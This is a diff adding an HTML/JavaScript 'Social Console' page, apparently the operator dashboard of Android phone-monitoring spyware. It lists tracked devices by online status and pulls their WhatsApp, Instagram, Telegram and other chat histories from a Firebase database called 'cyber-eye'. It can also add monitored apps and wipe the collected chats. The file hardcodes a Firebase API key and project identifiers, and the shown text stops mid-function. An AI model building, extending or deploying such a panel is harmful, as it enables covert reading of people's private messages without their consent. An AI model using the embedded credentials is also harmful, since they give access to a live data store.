@@ -1,0 +1,1459 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Social Console</title>
+  <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+  <script src="/static/firebase-mock.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --bg: #0a0b0d;
+      --surface: #111316;
+      --surface-2: #16181c;
+      --border: #1f2227;
+      --border-2: #262a30;
+      --text: #e6e8eb;
+      --muted: #8b9199;
+      --accent: #3b82f6;
+    }
+
+    html,
+    body {
+      height: 100%;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      padding: 20px;
+      -webkit-font-smoothing: antialiased;
+      transition: background .4s ease;
+    }
+
+    body.theme-wa {
+      background: #0a0f0d;
+    }
+
+    body.theme-tg {
+      background: #0a0f14;
+    }
+
+    body.theme-ig {
+      background: #08080a;
+    }
+
+    .container {
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+
+    /* Top bar — minimal */
+    .top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 0 18px;
+      gap: 16px;
+    }
+
+    .status {
+      display: none !important;
+      align-items: center;
+      gap: 10px;
+      font-size: 13px;
+      color: var(--muted);
+      font-weight: 500;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #ef4444;
+      box-shadow: 0 0 0 3px rgba(239, 68, 68, .15);
+    }
+
+    .dot.online {
+      background: #22c55e;
+      box-shadow: 0 0 0 3px rgba(34, 197, 94, .15);
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+
+      0%,
+      100% {
+        opacity: 1
+      }
+
+      50% {
+        opacity: .55
+      }
+    }
+
+    .toolbar {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+    }
+
+    /* Device select */
+    .device-wrap {
+      position: relative;
+    }
+
+    select#device-select {
+      min-width: 280px;
+      padding: 10px 38px 10px 40px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      color: var(--text);
+      border-radius: 10px;
+      font-size: 13px;
+      font-weight: 500;
+      font-family: inherit;
+      appearance: none;
+      cursor: pointer;
+      outline: none;
+      transition: .2s;
+    }
+
+    select#device-select:hover,
+    select#device-select:focus {
+      border-color: var(--border-2);
+      background: var(--surface-2);
+    }
+
+    select#device-select option {
+      background: #111;
+      color: #eee;
+    }
+
+    .device-wrap .ico-l,
+    .device-wrap .ico-r {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--muted);
+      pointer-events: none;
+      display: flex;
+    }
+
+    .device-wrap .ico-l {
+      left: 14px;
+    }
+
+    .device-wrap .ico-r {
+      right: 12px;
+    }
+
+    /* Buttons */
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 14px;
+      border-radius: 10px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      color: var(--text);
+      font-size: 13px;
+      font-weight: 500;
+      font-family: inherit;
+      cursor: pointer;
+      transition: .2s;
+    }
+
+    .btn:hover {
+      background: var(--surface-2);
+      border-color: var(--border-2);
+    }
+
+    .btn-danger {
+      color: #f87171;
+    }
+
+    .btn-danger:hover {
+      background: rgba(239, 68, 68, .1);
+      border-color: rgba(239, 68, 68, .4);
+      color: #ef4444;
+    }
+
+    .btn-primary {
+      color: #3b82f6;
+    }
+    .btn-primary:hover {
+      background: rgba(59, 130, 246, .1);
+      border-color: rgba(59, 130, 246, .4);
+    }
+
+    /* Modal styles */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(5px);
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-content {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 24px;
+      width: 400px;
+      max-width: 90%;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+    }
+    .btn-wipe {
+      background: rgba(239, 68, 68, 0.15) !important;
+      color: #ef4444 !important;
+      border: 1px solid rgba(239, 68, 68, 0.3) !important;
+      padding: 4px 10px !important;
+      font-size: 0.75rem !important;
+      font-weight: 600 !important;
+      border-radius: 6px !important;
+      cursor: pointer !important;
+      display: inline-flex !important;
+      align-items: center !important;
+      gap: 5px !important;
+      transition: all 0.2s !important;
+      margin-left: auto !important;
+      font-family: inherit !important;
+      height: 28px !important;
+      line-height: 1 !important;
+    }
+    .btn-wipe:hover {
+      background: #ef4444 !important;
+      color: #fff !important;
+    }
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 18px;
+    }
+    .modal-header h3 {
+      font-size: 16px;
+      font-weight: 600;
+    }
+    .modal-close {
+      cursor: pointer;
+      font-size: 20px;
+      color: var(--muted);
+      border: none;
+      background: none;
+    }
+    .modal-close:hover {
+      color: var(--text);
+    }
+    .modal-body .field-group {
+      margin-bottom: 14px;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      width: 100%;
+    }
+    .modal-body label {
+      display: block;
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 6px;
+      font-weight: 500;
+    }
+    .modal-body input {
+      width: 100%;
+      padding: 10px;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      color: var(--text);
+      border-radius: 8px;
+      font-size: 13px;
+      outline: none;
+    }
+    .modal-body input:focus {
+      border-color: var(--accent);
+    }
+    .modal-footer {
+      display: flex;
+      justify-content: flex-end;
+      gap: 10px;
+      margin-top: 20px;
+    }
+    .tab .tab-close {
+      margin-left: 8px;
+      font-size: 14px;
+      color: var(--muted);
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      transition: .2s;
+    }
+    .tab .tab-close:hover {
+      background: rgba(239, 68, 68, .2);
+      color: #ef4444;
+    }
+
+    /* Platform tabs — real logos */
+    .platform-tabs {
+      display: flex;
+      gap: 6px;
+      margin-bottom: 16px;
+      padding: 5px;
+      background: var(--surface);
+      border-radius: 12px;
+      border: 1px solid var(--border);
+      width: fit-content;
+    }
+
+    .tab {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 9px 18px;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--muted);
+      cursor: pointer;
+      transition: all .25s ease;
+      user-select: none;
+    }
+
+    .tab img {
+      width: 18px;
+      height: 18px;
+      filter: grayscale(1) opacity(.55);
+      transition: filter .25s ease;
+    }
+
+    .tab:hover {
+      color: var(--text);
+    }
+
+    .tab:hover img {
+      filter: grayscale(0) opacity(1);
+    }
+
+    .tab.active {
+      color: #fff;
+    }
+
+    .tab.active img {
+      filter: none;
+    }
+
+    .tab[data-p="wa"].active {
+      background: #00a884;
+    }
+
+    .tab[data-p="ig"].active {
+      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+    }
+
+    .tab[data-p="tg"].active {
+      background: linear-gradient(135deg, #2AABEE, #229ED9);
+    }
+
+    /* App frame */
+    .app-frame {
+      display: flex;
+      height: 78vh;
+      border-radius: 16px;
+      overflow: hidden;
+      border: 1px solid var(--border);
+      background: var(--surface);
+      box-shadow: 0 24px 60px rgba(0, 0, 0, .5);
+      transition: background .4s ease;
+      animation: frameIn .4s ease;
+    }
+
+    @keyframes frameIn {
+      from {
+        opacity: 0;
+        transform: translateY(8px);
+      }
+
+      to {
+        opacity: 1;
+        transform: none;
+      }
+    }
+
+    .sidebar {
+      width: 340px;
+      display: flex;
+      flex-direction: column;
+      border-right: 1px solid var(--border);
+      background: var(--surface);
+    }
+
+    .sidebar-head {
+      padding: 16px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .sidebar-head .title {
+      font-weight: 700;
+      font-size: 17px;
+    }
+
+    .search {
+      margin: 10px 12px 8px;
+      padding: 9px 14px;
+      border-radius: 10px;
+      background: var(--surface-2);
+      font-size: 13px;
+      color: var(--muted);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      border: 1px solid transparent;
+    }
+
+    .contacts {
+      flex: 1;
+      overflow-y: auto;
+      padding: 4px 0;
+    }
+
+    .contacts::-webkit-scrollbar,
+    .chat-scroll::-webkit-scrollbar {
+      width: 6px;
+    }
+
+    .contacts::-webkit-scrollbar-thumb,
+    .chat-scroll::-webkit-scrollbar-thumb {
+      background: rgba(255, 255, 255, .08);
+      border-radius: 3px;
+    }
+
+    .contact {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 16px;
+      cursor: pointer;
+      transition: .15s;
+    }
+
+    .contact:hover {
+      background: rgba(255, 255, 255, .03);
+    }
+
+    .contact.active {
+      background: rgba(255, 255, 255, .06);
+    }
+
+    .avatar {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      flex-shrink: 0;
+      display: grid;
+      place-items: center;
+      font-weight: 600;
+      color: #fff;
+      font-size: 15px;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      letter-spacing: .5px;
+    }
+
+    .contact-info {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .contact-name {
+      font-size: 14.5px;
+      font-weight: 600;
+      color: var(--text);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .contact-sub {
+      font-size: 12.5px;
+      color: var(--muted);
+      margin-top: 2px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    /* Chat area */
+    .chat-area {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
+
+    .chat-head {
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border-bottom: 1px solid var(--border);
+      background: var(--surface);
+    }
+
+    .chat-head .avatar {
+      width: 40px;
+      height: 40px;
+      font-size: 14px;
+    }
+
+    .chat-head .name {
+      font-weight: 600;
+      font-size: 15px;
+    }
+
+    .chat-head .presence {
+      font-size: 12px;
+      color: var(--muted);
+      margin-top: 2px;
+    }
+
+    .chat-scroll {
+      flex: 1;
+      overflow-y: auto;
+      padding: 22px 26px;
+      display: flex;
+      flex-direction: column-reverse;
+      gap: 6px;
+    }
+
+    .empty-state {
+      flex: 1;
+      display: grid;
+      place-items: center;
+      text-align: center;
+      color: var(--muted);
+      font-size: 14px;
+      padding: 40px;
+    }
+
+    .empty-state .big-logo {
+      width: 72px;
+      height: 72px;
+      margin: 0 auto 18px;
+      opacity: .35;
+      transition: opacity .3s;
+    }
+
+    .empty-state .hint {
+      font-size: 13px;
+      color: var(--muted);
+    }
+
+    /* Messages */
+    .msg {
+      max-width: 65%;
+      padding: 8px 12px 6px;
+      border-radius: 12px;
+      font-size: 14px;
+      line-height: 1.45;
+      word-wrap: break-word;
+      animation: msgIn .28s ease;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, .15);
+    }
+
+    @keyframes msgIn {
+      from {
+        opacity: 0;
+        transform: translateY(4px);
+      }
+
+      to {
+        opacity: 1;
+        transform: none;
+      }
+    }
+
+    .msg.sent {
+      align-self: flex-end;
+      border-bottom-right-radius: 4px;
+    }
+
+    .msg.received {
+      align-self: flex-start;
+      border-bottom-left-radius: 4px;
+    }
+
+    .msg .t {
+      display: block;
+      font-size: 10.5px;
+      opacity: .65;
+      margin-top: 4px;
+      text-align: right;
+    }
+
+    /* ==== WhatsApp ==== */
+    .app-frame.theme-wa {
+      background: #111b21;
+    }
+
+    .theme-wa .sidebar {
+      background: #111b21;
+      border-right-color: #222d34;
+    }
+
+    .theme-wa .sidebar-head,
+    .theme-wa .chat-head {
+      background: #202c33;
+      border-bottom-color: #222d34;
+    }
+
+    .theme-wa .search {
+      background: #202c33;
+    }
+
+    .theme-wa .chat-area {
+      background-color: #0b141a;
+      background-image:
+        radial-gradient(rgba(255, 255, 255, .015) 1px, transparent 1px),
+        radial-gradient(rgba(255, 255, 255, .015) 1px, transparent 1px);
+      background-size: 22px 22px, 22px 22px;
+      background-position: 0 0, 11px 11px;
+    }
+
+    .theme-wa .msg.sent {
+      background: #005c4b;
+      color: #e9edef;
+    }
+
+    .theme-wa .msg.received {
+      background: #202c33;
+      color: #e9edef;
+    }
+
+    .theme-wa .avatar {
+      background: linear-gradient(135deg, #00a884, #008069);
+    }
+
+    .theme-wa .contact {
+      border-bottom: 1px solid rgba(255, 255, 255, .03);
+    }
+
+    /* ==== Telegram ==== */
+    .app-frame.theme-tg {
+      background: #17212b;
+    }
+
+    .theme-tg .sidebar {
+      background: #17212b;
+      border-right-color: #0e1621;
+    }
+
+    .theme-tg .sidebar-head,
+    .theme-tg .chat-head {
+      background: #17212b;
+      border-bottom-color: rgba(255, 255, 255, .05);
+    }
+
+    .theme-tg .search {
+      background: rgba(255, 255, 255, .05);
+      border-radius: 10px;
+    }
+
+    .theme-tg .chat-area {
+      background:
+        linear-gradient(135deg, rgba(23, 33, 43, .94), rgba(37, 54, 69, .94)),
+        radial-gradient(circle at 20% 20%, #2AABEE22, transparent 40%),
+        radial-gradient(circle at 80% 80%, #229ED922, transparent 40%);
+    }
+
+    .theme-tg .msg.sent {
+      background: linear-gradient(135deg, #3a7bd5, #2b5278);
+      color: #fff;
+    }
+
+    .theme-tg .msg.received {
+      background: #182533;
+      color: #fff;
+    }
+
+    .theme-tg .avatar {
+      background: linear-gradient(135deg, #2AABEE, #229ED9);
+    }
+
+    .theme-tg .contact.active {
+      background: rgba(42, 171, 238, .12);
+    }
+
+    /* ==== Instagram ==== */
+    .app-frame.theme-ig {
+      background: #000;
+      border-color: #262626;
+    }
+
+    .theme-ig .sidebar {
+      background: #000;
+      border-right-color: #262626;
+    }
+
+    .theme-ig .sidebar-head,
+    .theme-ig .chat-head {
+      background: #000;
+      border-bottom-color: #262626;
+    }
+
+    .theme-ig .search {
+      background: #1a1a1a;
+      border-radius: 10px;
+    }
+
+    .theme-ig .chat-area {
+      background: #000;
+    }
+
+    .theme-ig .msg.sent {
+      background: linear-gradient(45deg, #405de6, #833ab4, #c13584, #e1306c, #fd1d1d);
+      color: #fff;
+      border-radius: 18px 18px 4px 18px;
+    }
+
+    .theme-ig .msg.received {
+      background: #262626;
+      color: #fafafa;
+      border-radius: 18px 18px 18px 4px;
+    }
+
+    .theme-ig .avatar {
+      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+      padding: 2px;
+    }
+
+    .theme-ig .avatar::before {
+      content: attr(data-i);
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      background: #000;
+      display: grid;
+      place-items: center;
+      color: #fff;
+    }
+
+    .theme-ig .contact.active {
+      background: #121212;
+    }
+
+    .loading {
+      padding: 24px;
+      text-align: center;
+      color: var(--muted);
+      font-size: 13px;
+    }
+
+    @media (max-width: 820px) {
+      body {
+        padding: 12px;
+      }
+
+      .top {
+        flex-direction: column;
+        align-items: stretch;
+      }
+
+      .toolbar {
+        flex-wrap: wrap;
+      }
+
+      select#device-select {
+        min-width: 100%;
+      }
+
+      .app-frame {
+        flex-direction: column;
+        height: auto;
+      }
+
+      .sidebar {
+        width: 100%;
+        max-height: 42vh;
+        border-right: none;
+        border-bottom: 1px solid var(--border);
+      }
+
+      .chat-scroll {
+        min-height: 42vh;
+      }
+
+      .platform-tabs {
+        width: 100%;
+      }
+
+      .tab {
+        flex: 1;
+        justify-content: center;
+      }
+    }
+  </style>
+</head>
+
+<body class="theme-wa">
+  <div class="container">
+
+    <div class="top">
+      <div class="status">
+        <div id="status-dot" class="dot"></div>
+        <span id="status-text">Offline</span>
+      </div>
+      <div class="toolbar">
+        <div class="device-wrap">
+          <span class="ico-l">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+              stroke-linecap="round" stroke-linejoin="round">
+              <rect x="5" y="2" width="14" height="20" rx="2" />
+              <line x1="12" y1="18" x2="12" y2="18" />
+            </svg>
+          </span>
+          <select id="device-select" onchange="selectDevice(this.value)">
+            <option value="">Select device</option>
+          </select>
+          <span class="ico-r">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+              stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="6 9 12 15 18 9" />
+            </svg>
+          </span>
+        </div>
+        <button class="btn btn-primary" onclick="openCustomAppModal()">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="12" y1="5" x2="12" y2="19" />
+            <line x1="5" y1="12" x2="19" y2="12" />
+          </svg>
+          Add Custom App
+        <button class="btn btn-danger" id="btn-delete-app" style="display:none;" onclick="deleteActiveCustomApp()">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+            stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="3 6 5 6 21 6" />
+            <path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6" />
+            <path d="M10 11v6" />
+            <path d="M14 11v6" />
+          </svg>
+          Remove App
+        </button>
+      </div>
+    </div>
+
+    <div class="cyber-loader" id="cyber-loader">
+        <div class="cyber-loader-bar"></div>
+        <div class="cyber-loader-text" id="cyber-loader-text">CONNECTING NODE... 0%</div>
+    </div>
+
+    <div class="platform-tabs">
+      <div class="tab active" data-p="wa" onclick="setPlatform('com_whatsapp','wa', this)">
+        <img src="https://cdn.simpleicons.org/whatsapp/ffffff" alt="WhatsApp">
+        <span>WhatsApp</span>
+      </div>
+      <div class="tab" data-p="ig" onclick="setPlatform('com_instagram_android','ig', this)">
+        <img src="https://cdn.simpleicons.org/instagram/ffffff" alt="Instagram">
+        <span>Instagram</span>
+      </div>
+      <div class="tab" data-p="tg" onclick="setPlatform('org_telegram_messenger','tg', this)">
+        <img src="https://cdn.simpleicons.org/telegram/ffffff" alt="Telegram">
+        <span>Telegram</span>
+      </div>
+    </div>
+
+    <div class="app-frame theme-wa" id="app-frame">
+      <aside class="sidebar">
+        <div class="sidebar-head" style="display:flex; align-items:center; gap:10px; width:100%;">
+          <div class="title" id="side-title" style="margin-right:auto;">Chats</div>
+          <button class="btn-wipe" onclick="clearPlatformData()" title="Wipe all chats for this platform">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="3 6 5 6 21 6"></polyline>
+              <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
+              <line x1="10" y1="11" x2="10" y2="17"></line>
+              <line x1="14" y1="11" x2="14" y2="17"></line>
+            </svg>
+            Wipe
+          </button>
+        </div>
+        <div class="search">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+            stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="8" />
+            <line x1="21" y1="21" x2="16.65" y2="16.65" />
+          </svg>
+          <span>Search</span>
+        </div>
+        <div class="contacts" id="contacts">
+          <div class="loading">Select a device to begin</div>
+        </div>
+      </aside>
+      <section class="chat-area" id="chat-area">
+        <div class="empty-state" id="empty">
+          <div>
+            <img id="empty-logo" class="big-logo" src="https://cdn.simpleicons.org/whatsapp/ffffff" alt="">
+            <div id="empty-text" class="hint">Open a WhatsApp conversation</div>
+          </div>
+        </div>
+      </section>
+    </div>
+
+  </div>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyAHkYidYFElwq3Mt13t0jlpIlhw33DtVco",
+      databaseURL: "https://cyber-eye-ccb1e-default-rtdb.firebaseio.com",
+      projectId: "cyber-eye-ccb1e",
+      storageBucket: "cyber-eye-ccb1e.firebasestorage.app",
+      appId: "1:652079429761:android:e17fe06347e2ba0b1a3580"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    let activeID = "";
+    let activePlatform = "com_whatsapp";
+    let activeTheme = "wa";
+    let activeContact = "";
+    let activeContactName = "";
+    const ONLINE_THRESHOLD = 300000;
+
+    // Extract query parameters
+    const urlParams = new URLSearchParams(window.location.search);
+    const paramId = urlParams.get('id');
+    const paramPlatform = urlParams.get('platform');
+
+    // Run automatically if parameters are provided
+    window.addEventListener('DOMContentLoaded', () => {
+      if (paramId) {
+        // Inject borderless styles to fill the iframe panel completely
+        const style = document.createElement('style');
+        style.textContent = `
+          body {
+            padding: 0 !important;
+            background: #0e1118 !important; /* Set to custom dark background */
+          }
+          .container {
+            max-width: 100% !important;
+            width: 100% !important;
+            padding: 0 !important;
+            margin: 0 !important;
+            height: 100vh !important;
+            display: flex !important;
+            flex-direction: column !important;
+          }
+          .app-frame {
+            height: calc(100vh - 85px) !important;
+            border-radius: 12px !important; /* Curved corners */
+            border: 1px solid rgba(255,255,255,0.05) !important;
+            box-shadow: none !important;
+            flex: 1 !important;
+            margin: 10px 20px 20px 25px !important; /* Space on left, right, bottom */
+          }
+          .top {
+            padding: 12px 25px !important;
+            background: #0e1118 !important; /* Match top bar background */
+            border-bottom: 1px solid rgba(255,255,255,0.07) !important;
+          }
+          select#device-select, .btn {
+            background: #1c232e !important;
+            border-color: rgba(255,255,255,0.05) !important;
+          }
+
+          /* ── CYBER LOAD BAR ── */
+          .cyber-loader {
+              height: 24px;
+              width: 100%;
+              background: transparent;
+              position: relative;
+              display: none;
+              overflow: visible;
+          }
+          .cyber-loader-bar {
+              height: 3px;
+              background: linear-gradient(90deg, #2ecc8f 0%, #22d3ee 100%);
+              width: 0%; /* Start at 0% and animate width */
+              position: absolute;
+              left: 0;
+              top: 0;
+              transition: width 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+              box-shadow: none; /* Removed heavy glow for professional clean look */
+          }
+          .cyber-loader-text {
+              color: #2ecc8f;
+              font-size: 11px;
+              font-family: 'Consolas', monospace;
+              position: absolute;
+              right: 25px;
+              top: 8px;
+              font-weight: 700;
+              letter-spacing: 0.5px;
+              opacity: 0.85;
+          }
+        `;
+        document.head.appendChild(style);
+
+        const deviceWrap = document.querySelector('.device-wrap');
+        if (deviceWrap) deviceWrap.style.display = 'none';
+        
+        const select = document.getElementById("device-select");
+        if (select) select.value = paramId;
+        
+        selectDevice(paramId);
+      }
+    });
+
+    const PLATFORM_META = {
+      wa: { title: "Chats", label: "WhatsApp", logo: "https://cdn.simpleicons.org/whatsapp/ffffff" },
+      ig: { title: "Messages", label: "Instagram Direct", logo: "https://cdn.simpleicons.org/instagram/ffffff" },
+      tg: { title: "Telegram", label: "Telegram", logo: "https://cdn.simpleicons.org/telegram/ffffff" },
+    };
+
+    function initials(name) {
+      if (!name) return "?";
+      const p = name.trim().split(/\s+/);
+      return ((p[0]?.[0] || "") + (p[1]?.[0] || "")).toUpperCase() || "?";
+    }
+    function esc(s) { return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
+
+    db.ref("devices").on("value", snap => {
+      const select = document.getElementById("device-select");
+      const current = select.value || paramId || "";
+      select.innerHTML = "<option value=''>Select device</option>";
+      if (!snap.val()) return;
+      const now = Date.now();
+      Object.keys(snap.val()).forEach(id => {
+        const dev = snap.val()[id];
+        const online = (now - (dev.lastSeen || 0)) < ONLINE_THRESHOLD;
+        const opt = document.createElement("option");
+        opt.value = id;
+        opt.innerText = (online ? "● " : "○ ") + id + "  ·  " + (online ? "Online" : "Offline");
+        select.appendChild(opt);
+      });
+      if (current) { select.value = current; updateStatus(snap.val()[current]); }
+    });
+
+    let customApps = {};
+
+    function selectDevice(id) {
+      activeID = id;
+      if (!id) {
+        customApps = {};
+        renderTabs();
+        return;
+      }
+      db.ref("devices/" + id).once("value", s => updateStatus(s.val()));
+      loadCustomApps();
+    }
+
+    async function loadCustomApps() {
+      if (!activeID) return;
+      try {
+        const resp = await fetch('/api/device/' + activeID + '/monitored_apps');
+        customApps = await resp.json();
+        
+        // Dynamically add custom apps metadata to PLATFORM_META
+        if (customApps) {
+          Object.keys(customApps).forEach(key => {
+            const app = customApps[key];
+            const fbPkgKey = app.package.replace(/\./g, '_');
+            if (!PLATFORM_META[fbPkgKey]) {
+              PLATFORM_META[fbPkgKey] = {
+                title: "Chats",
+                label: app.name,
+                logo: "https://cdn.simpleicons.org/android/ffffff"
+              };
+            }
+          });
+        }
+        
+        renderTabs();
+        loadContacts();
+      } catch (e) {
+        console.error("Error loading custom apps:", e);
+      }
+    }
+
+    function renderTabs() {
+      const container = document.querySelector('.platform-tabs');
+      if (paramPlatform) {
+        container.style.display = 'none';
+        
+        if (paramPlatform === 'wa') {
+          activePlatform = "com_whatsapp";
+          activeTheme = "wa";
+        } else if (paramPlatform === 'ig') {
+          activePlatform = "com_instagram_android";
+          activeTheme = "ig";
+        } else if (paramPlatform === 'tg') {
+          activePlatform = "org_telegram_messenger";
+          activeTheme = "tg";
+        } else {
+          activePlatform = paramPlatform;
+          activeTheme = paramPlatform;
+          
+          const delAppBtn = document.getElementById("btn-delete-app");
+          if (delAppBtn) delAppBtn.style.display = "inline-flex";
+        }
+        
+        document.body.className = '';
+        document.body.classList.add('theme-' + activeTheme);
+        document.getElementById('app-frame').className = "app-frame theme-" + activeTheme;
+        const meta = PLATFORM_META[activeTheme];
+        document.getElementById('side-title').innerText = meta.title;
+        resetChatArea();
+        return;
+      }
+
+      container.innerHTML = `
+        <div class="tab active" data-p="wa" onclick="setPlatform('com_whatsapp','wa', this)">
+          <img src="https://cdn.simpleicons.org/whatsapp/ffffff" alt="WhatsApp">
+          <span>WhatsApp</span>
+        </div>
+        <div class="tab" data-p="ig" onclick="setPlatform('com_instagram_android','ig', this)">
+          <img src="https://cdn.simpleicons.org/instagram/ffffff" alt="Instagram">
+          <span>Instagram</span>
+        </div>
+        <div class="tab" data-p="tg" onclick="setPlatform('org_telegram_messenger','tg', this)">
+          <img src="https://cdn.simpleicons.org/telegram/ffffff" alt="Telegram">
+          <span>Telegram</span>
+        </div>
+      `;
+
+      activePlatform = "com_whatsapp";
+      activeTheme = "wa";
+      document.body.className = "theme-wa";
+      document.getElementById('app-frame').className = "app-frame theme-wa";
+      document.getElementById('side-title').innerText = "Chats";
+      resetChatArea();
+
+      if (activeID && customApps) {
+        Object.keys(customApps).forEach(key => {
+          const app = customApps[key];
+          const tab = document.createElement('div');
+          tab.className = 'tab';
+          tab.setAttribute('data-p', key);
+          
+          const fbPkgKey = app.package.replace(/\./g, '_');
+          
+          tab.innerHTML = `
+            <img src="https://cdn.simpleicons.org/android/ffffff" alt="${esc(app.name)}">
+            <span>${esc(app.name)}</span>
+            <span class="tab-close" onclick="deleteCustomApp('${esc(app.package)}', event)">&times;</span>
+          `;
+          
+          tab.onclick = (e) => {
+            if (e.target.classList.contains('tab-close')) return;
+            
+            if (!PLATFORM_META[fbPkgKey]) {
+              PLATFORM_META[fbPkgKey] = {
+                title: "Chats",
+                label: app.name,
+                logo: "https://cdn.simpleicons.org/android/ffffff"
+              };
+            }
+            setPlatform(fbPkgKey, fbPkgKey, tab);
+          };
+          container.appendChild(tab);
+        });
+      }
+    }
+
+    function updateStatus(dev) {
+      const dot = document.getElementById("status-dot");
+      const text = document.getElementById("status-text");
+      if (!dev) return;
+      const online = (Date.now() - (dev.lastSeen || 0)) < ONLINE_THRESHOLD;
+      dot.classList.toggle("online", online);
+      text.innerText = online ? "Online" : "Offline";
+      text.style.color = online ? "#22c55e" : "#ef4444";
+    }
+
+    function setPlatform(plt, theme, el) {
+      activePlatform = plt;
+      activeTheme = theme;
+      activeContact = "";
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      el.classList.add('active');
+
+      document.body.className = '';
+      document.body.classList.add('theme-' + theme);
+
+      const frame = document.getElementById('app-frame');
+      frame.className = 'app-frame';
+      frame.style.animation = 'none'; void frame.offsetWidth; frame.style.animation = '';
+      frame.classList.add('theme-' + theme);
+
+      const meta = PLATFORM_META[theme] || { title: "Chats", label: theme, logo: "https://cdn.simpleicons.org/android/ffffff" };
+      document.getElementById('side-title').innerText = meta.title;
+      resetChatArea();
+      loadContacts();
+    }
+
+    function resetChatArea() {
+      const area = document.getElementById('chat-area');
+      const meta = PLATFORM_META[activeTheme] || { title: "Chats", label: activeTheme, logo: "https://cdn.simpleicons.org/android/ffffff" };
+      area.innerHTML = `<div class="empty-state">
+      <div>
+        <img class="big-logo" src="${meta.logo}" alt="">
+        <div class="hint">Open a ${meta.label} conversation</div>
+      </div>
+    </div>`;
+    }
+
+    function loadContacts() {
+      if (!activeID) return;
+      
+      // Trigger loading bar logic inside social views
+      const loader = document.getElementById("cyber-loader");
+      const bar = loader ? loader.querySelector(".cyber-loader-bar") : null;
+      const textVal = document.getElementById("cyber-loader-text");
+      if (loader && bar) {
+        bar.style.width = "0%";
+        if (textVal) textVal.innerText = "CONNECTING DATABASE... 0%";
+        loader.style.display = "block";
+      }
+
+      let progress = 0;
+      const progressInterval = setInterval(() => {
+        if (progress < 90) {
+          progress += Math.floor(Math.random() * 15) + 5;
+          if (progress > 90) progress = 90;
+          if (bar) bar.style.width = progress + "%";
+          if (textVal) textVal.innerText = "RETRIEVING CHATS DATA... " + progress + "%";
+        }
+      }, 150);
+
+      const container = document.getElementById("contacts");
+      container.innerHTML = '<div class="loading">Loading contacts…</div>';
